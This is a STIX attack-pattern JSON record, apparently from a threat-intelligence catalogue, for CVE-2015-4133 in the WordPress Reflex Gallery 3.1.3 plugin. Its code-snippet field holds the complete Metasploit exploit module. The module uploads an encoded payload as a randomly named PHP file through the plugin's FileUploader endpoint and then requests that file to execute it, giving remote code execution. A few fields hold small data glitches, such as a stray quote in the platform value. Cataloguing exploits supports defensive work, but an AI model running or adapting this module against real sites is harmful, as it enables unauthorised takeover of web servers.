{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d37020f5-d415-460d-ac49-fe9968b6c12a",
    "created": "2024-08-14T17:13:00.41291Z",
    "modified": "2024-08-14T17:13:00.412914Z",
    "name": "Wordpress Reflex Gallery Upload Vulnerability",
    "description": " This module exploits an arbitrary PHP code upload in the WordPress Reflex Gallery version 3.1.3. The vulnerability allows for arbitrary file upload and remote code execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_reflexgallery_file_upload.rb",
            "external_id": "wp_reflexgallery_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-4133"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7867"
        },
        {
            "source_name": "DisclosureDate=>2012-12-30",
            "external_id": "#OSVDB?EDB?WPVDB?Cannotsetthedate."
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Wordpress Reflex Gallery Upload Vulnerability',\n      'Description'    => %q{\n        This module exploits an arbitrary PHP code upload in the WordPress Reflex Gallery\n        version 3.1.3. The vulnerability allows for arbitrary file upload and remote code execution.\n      },\n      'Author'         =>\n        [\n          'Unknown', # Vulnerability discovery\n          'Roberto Soares Espreto <robertoespreto[at]gmail.com>'  # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2015-4133'],\n          ['EDB', '36374'],\n          ['OSVDB', '88853'],\n          ['WPVDB', '7867']\n        ],\n      'Privileged'     => false,\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [['Reflex Gallery 3.1.3', {}]],\n      'DisclosureDate' => '2012-12-30', # OSVDB? EDB? WPVDB? Cannot set the date.\n      'DefaultTarget'  => 0)\n    )\n  end\n\n  def check\n    check_plugin_version_from_readme('reflex-gallery', '3.1.4')\n  end\n\n  def exploit\n    php_pagename = rand_text_alpha(8 + rand(8)) + '.php'\n\n    data = Rex::MIME::Message.new\n    data.add_part(payload.encoded, 'application/octet-stream', nil, \"form-data; name=\\\"qqfile\\\"; filename=\\\"#{php_pagename}\\\"\")\n    post_data = data.to_s\n\n    time = Time.new\n    year = time.year.to_s\n    month = \"%02d\" % time.month\n\n    res = send_request_cgi({\n      'uri'       => normalize_uri(wordpress_url_plugins, 'reflex-gallery', 'admin', 'scripts', 'FileUploader', 'php.php'),\n      'method'    => 'POST',\n      'vars_get'  => {\n        'Year'    => \"#{year}\",\n        'Month'   => \"#{month}\"\n      },\n      'ctype'     => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'      => post_data\n    })\n\n    if res\n      if res.code == 200 && res.body =~ /success|#{php_pagename}/\n        print_good(\"Our payload is at: #{php_pagename}. Calling payload...\")\n        register_files_for_cleanup(php_pagename)\n      else\n        fail_with(Failure::Unknown, \"#{peer} - Unable to deploy payload, server returned #{res.code}\")\n      end\n    else\n      fail_with(Failure::Unknown, 'Server did not respond in an expected way')\n    end\n\n    print_status(\"Calling payload...\")\n    send_request_cgi(\n      'uri'       => normalize_uri(wordpress_url_wp_content, 'uploads', \"#{year}\", \"#{month}\", php_pagename)\n    )\n  end\nend\n",
    "x_mitre_platforms": [
        "php'"
    ]
}